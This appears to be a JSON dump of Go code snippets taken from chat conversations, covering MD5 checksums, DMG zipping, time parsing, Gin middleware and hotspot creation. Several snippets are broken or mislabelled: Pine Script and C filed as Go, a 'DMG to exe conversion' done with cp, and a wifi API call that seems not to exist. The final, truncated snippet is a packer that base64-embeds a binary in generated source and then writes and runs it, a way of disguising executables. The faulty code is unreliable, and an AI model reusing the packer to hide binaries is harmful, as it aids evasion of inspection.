    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\ntype Task struct {\n\tid int\n}\n\ntype TaskExecutor struct {\n\ttaskChannel chan Task\n\twg          sync.WaitGroup\n}\n\nfunc NewTaskExecutor() *TaskExecutor {\n\treturn &TaskExecutor{\n\t\ttaskChannel: make(chan Task),\n\t}\n}\n\nfunc (te *TaskExecutor) Submit(task Task) {\n\tte.wg.Add(1)\n\n\tgo func(t Task) {\n\t\tte.taskChannel <- t\n\t}(task)\n}\n\nfunc (te *TaskExecutor) Run() {\n\tfor task := range te.taskChannel {\n\t\tfmt.Printf(\"Starting execution of Task %d\\n\", task.id)\n\t\t// Perform task execution here\n\n\t\tfmt.Printf(\"Finished execution of Task %d\\n\", task.id)\n\t\tte.wg.Done()\n\t}\n}\n\nfunc (te *TaskExecutor) Wait() {\n\tte.wg.Wait()\n}\n\nfunc main() {\n\ttaskExecutor := NewTaskExecutor()\n\n\tgo taskExecutor.Run()\n\n\tfor i := 1; i <= 60; i++ {\n\t\ttask := Task{id: i}\n\t\tif len(taskExecutor.taskChannel) >= 50 {\n\t\t\tfmt.Printf(\"Task %d submission failed\\n\", task.id)\n\t\t} else {\n\t\t\ttaskExecutor.Submit(task)\n\t\t\tfmt.Printf(\"Task %d submitted\\n\", task.id)\n\t\t}\n\t}\n\n\ttaskExecutor.Wait()\n}",
    "filename": "5e9ed22ca75a5d9ecbf76e43643da91f_1.go"
  },
  {
    "conversation_hash": "50d7c41990b16e48c27ac7e38b5d41a0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/md5\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Podanie ścieżki pliku wejściowego\n\tfilePath := \"suma.txt\"\n\t\n\t// Otwarcie pliku wejściowego\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\t\n\t// Inicjalizacja obiektu MD5\n\thash := md5.New()\n\t\n\t// Skopiowanie zawartości pliku do obiektu MD5\n\tif _, err := io.Copy(hash, file); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t\n\t// Pobranie sumy kontrolnej MD5 jako bajtów\n\thashBytes := hash.Sum(nil)\n\t\n\t// Konwersja bajtów do reprezentacji szesnastkowej\n\thashString := fmt.Sprintf(\"%x\", hashBytes)\n\n\t// Wyświetlenie sumy kontrolnej MD5\n\tfmt.Println(\"Suma kontrolna MD5:\", hashString)\n}",
    "filename": "50d7c41990b16e48c27ac7e38b5d41a0_0.go"
  },
  {
    "conversation_hash": "50d7c41990b16e48c27ac7e38b5d41a0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/md5\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Deklaracja flagi dla ścieżki do pliku wejściowego\n\tfilePath := flag.String(\"file\", \"\", \"ścieżka do pliku wejściowego\")\n\tflag.Parse()\n\n\t// Sprawdzenie, czy ścieżka do pliku została podana\n\tif *filePath == \"\" {\n\t\tlog.Fatal(\"Nie podano ścieżki do pliku wejściowego\")\n\t}\n\n\t// Otwarcie pliku wejściowego\n\tfile, err := os.Open(*filePath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t// Inicjalizacja obiektu MD5\n\thash := md5.New()\n\n\t// Skopiowanie zawartości pliku do obiektu MD5\n\tif _, err := io.Copy(hash, file); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Pobranie sumy kontrolnej MD5 jako bajtów\n\thashBytes := hash.Sum(nil)\n\n\t// Konwersja bajtów do reprezentacji szesnastkowej\n\thashString := fmt.Sprintf(\"%x\", hashBytes)\n\n\t// Wyświetlenie sumy kontrolnej MD5\n\tfmt.Println(\"Suma kontrolna MD5:\", hashString)\n}",
    "filename": "50d7c41990b16e48c27ac7e38b5d41a0_1.go"
  },
  {
    "conversation_hash": "50d7c41990b16e48c27ac7e38b5d41a0",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"archive/zip\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Podanie ścieżki pliku DMG wejściowego\n\tdmgPath := \"plik.dmg\"\n\t\n\t// Podanie ścieżki pliku ZIP wyjściowego\n\tzipPath := \"plik.zip\"\n\t\n\t// Otwieranie pliku DMG\n\tdmgFile, err := os.Open(dmgPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer dmgFile.Close()\n\n\t// Tworzenie pliku ZIP wyjściowego\n\tzipFile, err := os.Create(zipPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer zipFile.Close()\n\n\t// Inicjalizowanie bufora do kopiowania danych\n\tbuffer := make([]byte, 1024)\n\n\t// Tworzenie archiwum ZIP\n\tzipWriter := zip.NewWriter(zipFile)\n\n\t// Dodawanie pliku DMG do archiwum ZIP\n\tdmgInfo, err := dmgFile.Stat()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader, err := zip.FileInfoHeader(dmgInfo)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader.Name = dmgPath\n\tdmgWriter, err := zipWriter.CreateHeader(dmgHeader)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t_, err = io.Copy(dmgWriter, dmgFile)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zamykanie archiwum ZIP\n\terr = zipWriter.Close()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Konwersja DMG do ZIP zakończona pomyślnie.\")\n}",
    "filename": "50d7c41990b16e48c27ac7e38b5d41a0_2.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "str := \"123\"\nnum, err := strconv.ParseInt(str, 10, 64)\nif err != nil {\n    // 发生了错误，可能是由于无效的字符串格式\n    fmt.Println(\"转换失败：\", err)\n} else {\n    // 转换成功\n    fmt.Println(\"转换结果：\", num)\n}",
    "filename": "51f3ef51cf5f197617764914614be033_0.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "str := \"1970-01-01T00:00:00Z\"\nt, err := time.Parse(time.RFC3339, str)\nif err != nil {\n    fmt.Println(\"解析失败：\", err)\n} else {\n    fmt.Println(\"解析结果：\", t)\n}",
    "filename": "51f3ef51cf5f197617764914614be033_1.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "str := \"1970-01-01T00:00:00Z\"\nt, err := time.Parse(time.RFC3339, str)\nif err != nil {\n    fmt.Println(\"解析失败：\", err)\n} else {\n    timestamp := t.Unix()\n    fmt.Println(\"时间戳：\", timestamp)\n}",
    "filename": "51f3ef51cf5f197617764914614be033_2.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "str := \"2023-07-02T00:00:00Z\"\nlayout := \"2006-01-02T15:04:05Z\"  // 定义日期时间字符串的布局格式\nt, err := time.Parse(layout, str)\nif err != nil {\n    fmt.Println(\"解析失败：\", err)\n} else {\n    fmt.Println(\"解析结果：\", t)\n}",
    "filename": "51f3ef51cf5f197617764914614be033_3.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "str := \"2023-07-02T00:00:00Z\"\nlayout := \"2006-01-02T15:04:05Z\"  // 定义原始字符串的布局格式\nt, err := time.Parse(layout, str)\nif err != nil {\n    fmt.Println(\"解析失败：\", err)\n} else {\n    targetLayout := \"2006-01-02 15:04:05\"  // 定义目标格式的布局格式\n    targetStr := t.Format(targetLayout)\n    fmt.Println(targetStr)\n}",
    "filename": "51f3ef51cf5f197617764914614be033_5.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "startTimeStr := r.FormValue(\"startTime\") // 假设r是http.Request对象\nendTimeStr := r.FormValue(\"endTime\")\n\nlayout := \"2006-01-02 15:04:05\"  // 定义时间的布局格式\n\nstartTime, err := time.Parse(layout, startTimeStr)\nif err != nil {\n    // 返回错误，开始时间格式错误\n}\n\nendTime, err := time.Parse(layout, endTimeStr)\nif err != nil {\n    // 返回错误，结束时间格式错误\n}",
    "filename": "51f3ef51cf5f197617764914614be033_6.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func ErrorHandler() gin.HandlerFunc {\n    return func(c *gin.Context) {\n        // 捕捉错误\n        defer func() {\n            if err := recover(); err != nil {\n                // 在这里进行错误处理，例如记录日志等\n                // 可以根据需要自定义错误处理逻辑\n                log.Println(\"发生错误：\", err)\n                \n                // 返回一个自定义的错误响应给前端\n                c.JSON(http.StatusInternalServerError, gin.H{\n                    \"error\": \"Internal Server Error\",\n                })\n            }\n        }()\n        c.Next()\n    }\n}",
    "filename": "51f3ef51cf5f197617764914614be033_8.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    r := gin.Default()\n    \n    // 使用错误处理中间件\n    r.Use(ErrorHandler())\n    \n    // 在这里定义你的路由和处理逻辑\n    // ...\n    \n    // 启动应用程序\n    r.Run(\":8080\")\n}",
    "filename": "51f3ef51cf5f197617764914614be033_9.go"
  },
  {
    "conversation_hash": "51f3ef51cf5f197617764914614be033",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func MyHandler(c *gin.Context) {\n    // 假设在这里发生了某个错误\n    err := SomeFunc()\n    if err != nil {\n        // 抛出错误\n        panic(err)\n    }\n    \n    // 处理其他逻辑\n    // ...\n    \n    c.JSON(http.StatusOK, gin.H{\n        \"message\": \"Success\",\n    })\n}",
    "filename": "51f3ef51cf5f197617764914614be033_10.go"
  },
  {
    "conversation_hash": "e400c00c97281f2941734dbd377fc3dd",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Import required packages\nimport (\n    \"encoding/json\"\n)\n\n// Define the WebhookRsp2 struct type\ntype WebhookRsp2 struct {\n    Code   int             `json:\"Code\"`   // 0 is success\n    Msg    string          `json:\"Msg\"`\n    Result json.RawMessage `json:\"Result\"`\n}\n\n// Initialize a WebhookRsp2 instance\nwebhookRsp := WebhookRsp2{\n    Code:   200,\n    Msg:    \"Success\",\n    Result: json.RawMessage(\"{}\"), // Provide the desired JSON-encoded data in the Result field\n}",
    "filename": "e400c00c97281f2941734dbd377fc3dd_2.go"
  },
  {
    "conversation_hash": "0d685289c6559e96b7e961c73fab0492",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"archive/zip\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc main() {\n\t// Ustawianie flagi \"-file\" do podania ścieżki pliku DMG wejściowego\n\tdmgPath := flag.String(\"file\", \"\", \"Ścieżka do pliku DMG\")\n\tflag.Parse()\n\n\tif *dmgPath == \"\" {\n\t\tlog.Fatal(\"Podaj ścieżkę do pliku DMG\")\n\t}\n\n\t// Pobieranie nazwy pliku DMG\n\tdmgFileName := filepath.Base(*dmgPath)\n\n\t// Podanie ścieżki pliku ZIP wyjściowego na podstawie nazwy pliku DMG\n\tzipPath := dmgFileName + \".zip\"\n\n\t// Otwieranie pliku DMG\n\tdmgFile, err := os.Open(*dmgPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer dmgFile.Close()\n\n\t// Tworzenie pliku ZIP wyjściowego\n\tzipFile, err := os.Create(zipPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer zipFile.Close()\n\n\t// Inicjalizowanie bufora do kopiowania danych\n\tbuffer := make([]byte, 1024)\n\n\t// Tworzenie archiwum ZIP\n\tzipWriter := zip.NewWriter(zipFile)\n\n\t// Dodawanie pliku DMG do archiwum ZIP\n\tdmgInfo, err := dmgFile.Stat()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader, err := zip.FileInfoHeader(dmgInfo)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader.Name = dmgFileName\n\tdmgWriter, err := zipWriter.CreateHeader(dmgHeader)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t_, err = io.Copy(dmgWriter, dmgFile)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zamykanie archiwum ZIP\n\terr = zipWriter.Close()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Konwersja DMG do ZIP zakończona pomyślnie.\")\n}",
    "filename": "0d685289c6559e96b7e961c73fab0492_0.go"
  },
  {
    "conversation_hash": "0d685289c6559e96b7e961c73fab0492",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"archive/zip\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc main() {\n\t// Ustawianie flagi \"-file\" do podania ścieżki pliku DMG wejściowego\n\tdmgPath := flag.String(\"file\", \"\", \"Ścieżka do pliku DMG\")\n\tflag.Parse()\n\n\tif *dmgPath == \"\" {\n\t\tlog.Fatal(\"Podaj ścieżkę do pliku DMG\")\n\t}\n\n\t// Pobieranie nazwy pliku DMG\n\tdmgFileName := filepath.Base(*dmgPath)\n\n\t// Podanie ścieżki pliku ZIP wyjściowego na podstawie nazwy pliku DMG\n\tzipPath := dmgFileName + \".zip\"\n\n\t// Otwieranie pliku DMG\n\tdmgFile, err := os.Open(*dmgPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer dmgFile.Close()\n\n\t// Tworzenie pliku ZIP wyjściowego\n\tzipFile, err := os.Create(zipPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer zipFile.Close()\n\n\t// Tworzenie archiwum ZIP\n\tzipWriter := zip.NewWriter(zipFile)\n\n\t// Dodawanie pliku DMG do archiwum ZIP\n\tdmgInfo, err := dmgFile.Stat()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader, err := zip.FileInfoHeader(dmgInfo)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdmgHeader.Name = dmgFileName\n\tdmgWriter, err := zipWriter.CreateHeader(dmgHeader)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t_, err = io.Copy(dmgWriter, dmgFile)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Zamykanie archiwum ZIP\n\terr = zipWriter.Close()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Konwersja DMG do ZIP zakończona pomyślnie.\")\n}",
    "filename": "0d685289c6559e96b7e961c73fab0492_3.go"
  },
  {
    "conversation_hash": "3c6ed4b4050a25f335cf400adace5be5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/go-resty/resty/v2\"\n)\n\nfunc main() {\n\tclient := resty.New()\n\n\tresp, err := client.R().\n\t\tSetHeader(\"Content-Type\", \"application/json\").\n\t\tSetBody([]byte(`{\"username\":\"foo\",\"password\":\"bar\"}`)).\n\t\tPost(\"https://example.com/login\")\n\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(resp.Status())\n\tfmt.Println(resp.Body())\n}",
    "filename": "3c6ed4b4050a25f335cf400adace5be5_0.go"
  },
  {
    "conversation_hash": "98966192f0ae8cd47668354fb6f4b343",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "typedef struct {\n    uint32_t low;\n    uint32_t high;\n} uint64_t;\n\nuint64_t myUint64;\n\n// 存储64位值\nmyUint64.low = 0x1234;\nmyUint64.high = 0x5678;",
    "filename": "98966192f0ae8cd47668354fb6f4b343_5.go"
  },
  {
    "conversation_hash": "9c99a163dac29ddcbbc7734a7e163c3e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tdmgFilePath := \"/ścieżka/do/pliku.dmg\"\n\toutputExeFilePath := \"/ścieżka/do/wyjściowego/pliku.exe\"\n\n\t// Pobieranie ścieżki do hdiutil\n\thdiutilPath, err := exec.LookPath(\"hdiutil\")\n\tif err != nil {\n\t\tfmt.Println(\"HDIUtil nie zostało znalezione.\")\n\t\tos.Exit(1)\n\t}\n\n\t// Montowanie obrazu DMG\n\tmountCmd := exec.Command(hdiutilPath, \"attach\", dmgFilePath)\n\tif err := mountCmd.Run(); err != nil {\n\t\tfmt.Println(\"Błąd podczas montowania obrazu DMG:\", err)\n\t\tos.Exit(1)\n\t}\n\n\t// Znalezienie zamontowanego obrazu DMG\n\toutput, err := exec.Command(\"ls\", \"/Volumes\").Output()\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas wyszukiwania zamontowanego obrazu DMG:\", err)\n\t\tos.Exit(1)\n\t}\n\tmountedVolume := string(output)[:len(output)-1]\n\n\t// Konwertowanie zamontowanego obrazu DMG na plik wykonywalny\n\tconversionCmd := exec.Command(\"cp\", \"-R\", mountedVolume, outputExeFilePath)\n\tif err := conversionCmd.Run(); err != nil {\n\t\tfmt.Println(\"Błąd podczas konwersji obrazu DMG:\", err)\n\t\tos.Exit(1)\n\t}\n\n\t// Odmontowywanie obrazu DMG\n\tunmountCmd := exec.Command(hdiutilPath, \"detach\", \"/Volumes/\"+mountedVolume)\n\tif err := unmountCmd.Run(); err != nil {\n\t\tfmt.Println(\"Błąd podczas odmontowywania obrazu DMG:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"Konwersja zakończona pomyślnie.\")\n}",
    "filename": "9c99a163dac29ddcbbc7734a7e163c3e_0.go"
  },
  {
    "conversation_hash": "9c99a163dac29ddcbbc7734a7e163c3e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tvideoFilePath := \"/ścieżka/do/pliku.mp4\"\n\taudioFilePath := \"/ścieżka/do/pliku.mp3\"\n\toutputFilePath := \"/ścieżka/do/wyjściowego/pliku.mp4\"\n\n\t// Pobranie ścieżek do programów FFmpeg i FFprobe\n\tffmpegPath, err := exec.LookPath(\"ffmpeg\")\n\tif err != nil {\n\t\tlog.Fatal(\"FFmpeg nie zostało znalezione.\")\n\t}\n\tffprobePath, err := exec.LookPath(\"ffprobe\")\n\tif err != nil {\n\t\tlog.Fatal(\"FFprobe nie zostało znalezione.\")\n\t}\n\n\t// Sprawdzenie formatu wejściowego plików\n\taudioFormat, err := getFileFormat(audioFilePath, ffprobePath)\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas pobierania formatu pliku audio:\", err)\n\t}\n\tvideoFormat, err := getFileFormat(videoFilePath, ffprobePath)\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas pobierania formatu pliku wideo:\", err)\n\t}\n\n\t// Jeśli formaty nie są MP4, konwersja plików do formatu tymczasowego MP4\n\tif audioFormat != \"mp4\" {\n\t\ttempAudioFilePath := \"/ścieżka/do/tymczasowego/pliku_audio.mp4\"\n\t\terr = convertToMP4(audioFilePath, tempAudioFilePath, ffmpegPath)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Błąd podczas konwersji pliku audio:\", err)\n\t\t}\n\t\taudioFilePath = tempAudioFilePath\n\t}\n\tif videoFormat != \"mp4\" {\n\t\ttempVideoFilePath := \"/ścieżka/do/tymczasowego/pliku_wideo.mp4\"\n\t\terr = convertToMP4(videoFilePath, tempVideoFilePath, ffmpegPath)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Błąd podczas konwersji pliku wideo:\", err)\n\t\t}\n\t\tvideoFilePath = tempVideoFilePath\n\t}\n\n\t// Połączenie plików audio i wideo\n\terr = mergeFiles(videoFilePath, audioFilePath, outputFilePath, ffmpegPath)\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas łączenia plików:\", err)\n\t}\n\n\tfmt.Println(\"Połączono pliki wideo i audio.\")\n}\n\n// Funkcja pobierająca format pliku za pomocą FFprobe\nfunc getFileFormat(filePath string, ffprobePath string) (string, error) {\n\tcmd := exec.Command(ffprobePath, \"-v\", \"error\", \"-select_streams\", \"v:0\", \"-show_entries\", \"stream=codec_name\", \"-of\", \"default=nw=1:nk=1\", filePath)\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\treturn string(output[:len(output)-1]), nil\n}\n\n// Funkcja konwertująca plik do formatu MP4 za pomocą FFmpeg\nfunc convertToMP4(inputFilePath string, outputFilePath string, ffmpegPath string) error {\n\tcmd := exec.Command(ffmpegPath, \"-i\", inputFilePath, \"-c:v\", \"copy\", \"-c:a\", \"aac\", \"-b:a\", \"192k\", outputFilePath)\n\terr := cmd.Run()\n\tif err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\n\n// Funkcja łącząca pliki wideo i audio za pomocą FFmpeg\nfunc mergeFiles(videoFilePath string, audioFilePath string, outputFilePath string, ffmpegPath string) error {\n\tcmd := exec.Command(ffmpegPath, \"-i\", videoFilePath, \"-i\", audioFilePath, \"-c\", \"copy\", outputFilePath)\n\terr := cmd.Run()\n\tif err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}",
    "filename": "9c99a163dac29ddcbbc7734a7e163c3e_1.go"
  },
  {
    "conversation_hash": "bdb151bf143902dec89995512e1a7109",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\n\t\"github.com/mdlayher/wifi\"\n)",
    "filename": "bdb151bf143902dec89995512e1a7109_1.go"
  },
  {
    "conversation_hash": "bdb151bf143902dec89995512e1a7109",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func createHotspot(ssid, password string) error {\n\tc, err := wifi.New()\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer c.Close()\n\n\tinterfaceName := \"wlan0\" // Update with the appropriate network interface on your machine\n\n\t// Create a new access point\n\tap := wifi.AccessPoint{\n\t\tSSID:     ssid,\n\t\tPassword: password,\n\t}\n\n\terr = c.CreateAP(interfaceName, ap)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfmt.Printf(\"Access point %q created with password %q\\n\", ssid, password)\n\treturn nil\n}",
    "filename": "bdb151bf143902dec89995512e1a7109_2.go"
  },
  {
    "conversation_hash": "bdb151bf143902dec89995512e1a7109",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func createHotspotsFromFile(filename string) error {\n\tfile, err := os.Open(filename)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tssid := scanner.Text()\n\t\tpassword := \"YourHardcodedPassword\"\n\n\t\terr = createHotspot(ssid, password)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error creating hotspot for SSID %q: %v\\n\", ssid, err)\n\t\t}\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}",
    "filename": "bdb151bf143902dec89995512e1a7109_3.go"
  },
  {
    "conversation_hash": "bdb151bf143902dec89995512e1a7109",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tfilename := \"ssids.txt\" // Update with your own text file containing the SSIDs\n\n\terr := createHotspotsFromFile(filename)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "bdb151bf143902dec89995512e1a7109_4.go"
  },
  {
    "conversation_hash": "b1af4cbf1aa95252aae9430bea581e15",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc array_diff(a []int, b []int) []int {\n\tresult := []int{}\n\tfor _, num := range a {\n\t\tfound := false\n\t\tfor _, val := range b {\n\t\t\tif num == val {\n\t\t\t\tfound = true\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif !found {\n\t\t\tresult = append(result, num)\n\t\t}\n\t}\n\treturn result\n}\n\nfunc main() {\n\ta := []int{1, 2}\n\tb := []int{1}\n\tfmt.Println(array_diff(a, b)) // Output: [2]\n\n\ta = []int{1, 2, 2, 2, 3}\n\tb = []int{2}\n\tfmt.Println(array_diff(a, b)) // Output: [1, 3]\n}",
    "filename": "b1af4cbf1aa95252aae9430bea581e15_0.go"
  },
  {
    "conversation_hash": "611b45b5dd8459de486254983fd50d48",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Backtesting Strategy\", overlay=true)\n\n// Set the initial capital and position size\ninitial_capital = input(10000, title=\"Initial Capital\")\nposition_size = initial_capital / close\n\n// Set the desired start date for backtesting\nstart_date = timestamp(yyyy, mm, dd, 00, 00) // replace yyyy, mm, dd with desired start date\n\n// Define strategy variables\nvar bool buy_signal = false\nvar float stock_qty = na\nvar float buy_price = na\nvar float sell_threshold = na\n\n// Calculate percentage thresholds for buying and selling\nbuy_threshold = close * 0.08\nsell_threshold = close * 0.80\n\n// Entry condition\nif timestamp >= start_date and not(na(buy_signal)) and not(buy_signal)\n    buy_signal := true\n\n// Sell condition\nif buy_signal and low <= buy_price * 0.92\n    buy_signal := false\n    stock_qty := position_size * 0.8\n    sell_price = close\n    sell_signal = true\n\n// Buy condition\nif buy_signal and close <= sell_threshold\n    buy_signal := false\n    stock_qty := position_size\n    buy_price := close\n    sell_threshold := buy_price * 0.92\n\n// Plotting\nplot(strategy.equity, title=\"Equity\", color=color.blue, linewidth=2, style=plot.style_circles)\n\n// Debugging\nplot(buy_signal ? 1 : na, title=\"Buy Signal\", color=color.green, linewidth=2, style=plot.style_cross, transp=0)\nplot(sell_signal ? -1 : na, title=\"Sell Signal\", color=color.red, linewidth=2, style=plot.style_cross, transp=0)",
    "filename": "611b45b5dd8459de486254983fd50d48_0.go"
  },
  {
    "conversation_hash": "2641924ae0397e8950fbe4892bf4f76e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc obfuscateBinary(filePath string) error {\n\t// Read the binary file\n\tbinary, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to read binary file: %v\", err)\n\t}\n\n\t// Generate a random key for obfuscation\n\tkey := make([]byte, 32)\n\t_, err = rand.Read(key)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to generate random key: %v\", err)\n\t}\n\n\t// Encode the binary and key using base64\n\tencodedBinary := base64.RawStdEncoding.EncodeToString(binary)\n\tencodedKey := base64.RawStdEncoding.EncodeToString(key)\n\n\t// Obfuscated code template\n\tobfuscatedCode := `\npackage main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tencodedBinary := \"%s\"\n\tencodedKey := \"%s\"\n\n\tbinary, err := base64.RawStdEncoding.DecodeString(encodedBinary)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to decode binary:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tkey, err := base64.RawStdEncoding.DecodeString(encodedKey)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to decode key:\", err)\n\t\tos.Exit(1)\n\t}\n\n\terr = ioutil.WriteFile(\"temp.bin\", binary, 0700)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to write temporary file:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tcmd := exec.Command(\"./temp.bin\")\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\n\terr = cmd.Run()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to execute binary:\", err)\n\t\tos.Exit(1)\n\t}\n\n\t// Cleanup temporary file\n\tos.Remove(\"temp.bin\")\n}\n`\n\n\t// Generate the obfuscated code by replacing placeholders with actual values\n\tobfuscatedCode = fmt.Sprintf(obfuscatedCode, encodedBinary, encodedKey)\n\n\t// Write the obfuscated code to a temporary Go file\n\terr = ioutil.WriteFile(\"obfuscated.go\", []byte(obfuscatedCode), 0644)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to write obfuscated Go file: %v\", err)\n\t}\n\tdefer os.Remove(\"obfuscated.go\") // Cleanup temporary file\n\n\t// Compile the obfuscated Go code\n\tcmd := exec.Command(\"go\", \"build\", \"-o\", \"obfuscated-binary\", \"obfuscated.go\")\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\n\terr = cmd.Run()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to compile obfuscated binary: %v\", 